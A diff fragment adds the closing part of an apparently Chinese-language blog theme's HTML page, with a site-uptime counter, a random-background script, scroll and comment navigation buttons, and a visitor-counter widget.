+        document.getElementById("timeDate").innerHTML = "本站已运行 "+dnum+" 天 "; 
+        document.getElementById("times").innerHTML = hnum + " 小时 " + mnum + " 分 " + snum + " 秒"; 
+    } 
+setInterval("createtime()",250);
+</script>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+    <script>
+        $(document).ready(function() {
+            var iPad = window.navigator.userAgent.indexOf('iPad');
+            if (iPad > -1 || $(".left-col").css("display") === "none") {
+                var bgColorList = ["#9db3f4", "#414141", "#e5a859", "#f5dfc6", "#c084a0", "#847e72", "#cd8390", "#996731"];
+                var bgColor = Math.ceil(Math.random() * (bgColorList.length - 1));
+                $("body").css({"background-color": bgColorList[bgColor], "background-size": "cover"});
+            }
+            else {
+                var backgroundnum = 20;
+                var backgroundimg = "url(/background/bg-x.jpg)".replace(/x/gi, Math.ceil(Math.random() * backgroundnum));
+                $("body").css({"background": backgroundimg, "background-attachment": "fixed", "background-size": "cover"});
+            }
+        })
+    </script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+<script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
